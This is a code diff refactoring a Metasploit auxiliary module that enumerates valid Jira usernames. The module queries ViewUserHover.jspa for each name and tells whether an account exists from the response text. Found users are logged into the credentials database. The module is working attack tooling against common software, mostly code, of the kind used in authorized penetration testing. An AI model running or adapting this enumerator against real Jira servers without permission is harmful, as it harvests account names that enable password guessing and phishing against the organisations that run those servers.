@@ -8,6 +8,7 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
+  include Msf::Auxiliary::AuthBrute
 
   def initialize(info = {})
     super(
@@ -33,7 +34,7 @@ class MetasploitModule < Msf::Auxiliary
     )
     register_options(
       [
-        # Opt::RPORT(443),
+        # Opt::RPORT(8080),
         # Opt::SSL(true),
         OptString.new('TARGETURI', [true, 'Jira Path', '/']),
         OptString.new('USERNAME', [ false, 'Single username to test']),
@@ -41,67 +42,53 @@ class MetasploitModule < Msf::Auxiliary
                     [false, 'File containing usernames, one per line'])
       ]
     )
+    deregister_options('PASS_FILE', 'USERPASS_FILE', 'USER_AS_PASS', 'STOP_ON_SUCCESS', 'BLANK_PASSWORDS', 'DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS', 'PASSWORD')
   end
 
   def base_uri
     @base_uri ||= normalize_uri("#{target_uri.path}/secure/ViewUserHover.jspa?username=")
   end
 
-
-  # I was having issues with handling the username vs user_file so I copied and pasted this function from another module to fix it
-  def user_list
-    users = []
-
-    if datastore['USERNAME']
-      users << datastore['USERNAME']
-    elsif datastore['USER_FILE'] && File.readable?(datastore['USER_FILE'])
-      users += File.read(datastore['USER_FILE']).split
+  def do_user_enum(user)
+    print_status("Begin enumerating user at #{vhost}#{base_uri}")
+    print_status("checking user #{user}")
+    res = send_request_cgi!(
+      'uri' => "#{base_uri}#{user}",
+      'method' => 'GET',
+      'headers' => { 'Connection' => 'Close' }
+    )
+    if res.body.include?('User does not exist')
+      print_bad("'User #{user} does not exist'")
+    elsif res.body.include?('<a id="avatar-full-name-link"') # this works for 8.4.1 not sure about other verions
+      print_good("'User exists: #{user}'")
+      @users_found[user] = :reported
+    else
+      print_error('No Response From Server')
+      return :abort
     end
-
-    users
   end
 
   def run_host(_ip)
-    # Main method
-    # removed the check because it was not consistent
-    # unless check_host(ip) == Exploit::CheckCode::Appears
-    #  print_error("#{ip} does not appear to be vulnerable, will not continue")
-    #  return
-    # end
 
-    users = user_list
-    if users.empty?
-      print_error('Please populate USERNAME or USER_FILE')
-      return
+    @users_found = {}
+
+    each_user_pass do |user, _pass|
+      do_user_enum(user)
     end
+    if @users_found.empty?
+      print_status("#{full_uri} - No users found.")
+    else
+      print_good("#{full_uri} - Users found: #{@users_found.keys.sort.join(', ')}")
 
-    print_status("Begin enumerating users at #{vhost}#{base_uri}")
-
-    user_list.each do |user|
-      print_status("checking user #{user}")
-      res = send_request_cgi!(
-        'uri' => "#{base_uri}#{user}",
-        'method' => 'GET',
-        'headers' => { 'Connection' => 'Close' }
-      )
-      # print_status(res.body) was manually reading the response while troubleshooting
-      if res.body.include?('User does not exist')
-        print_bad("'User #{user} does not exist'")
-      elsif res.body.include?('<a id="avatar-full-name-link"') # this works for 8.4.1 not sure about other verions
-        print_good("'User exists: #{user}'")
-        # use the report_creds function to add the username to the creds db
-      connection_details = {
-          module_fullname: self.fullname,
-          username: user,
-          workspace_id: myworkspace_id,
-          status: Metasploit::Model::Login::Status::UNTRIED
-      }.merge(service_details)
-      create_credential_and_login(connection_details)
-      else
-        print_error('No response')
-      end
     end
+    connection_details = {
+      module_fullname: fullname,
+      username: @users_found.keys.sort.join(', '),
+      workspace_id: myworkspace_id,
+      status: Metasploit::Model::Login::Status::UNTRIED
+    }.merge(service_details)
+    create_credential_and_login(connection_details)
 
   end
-
 end
+
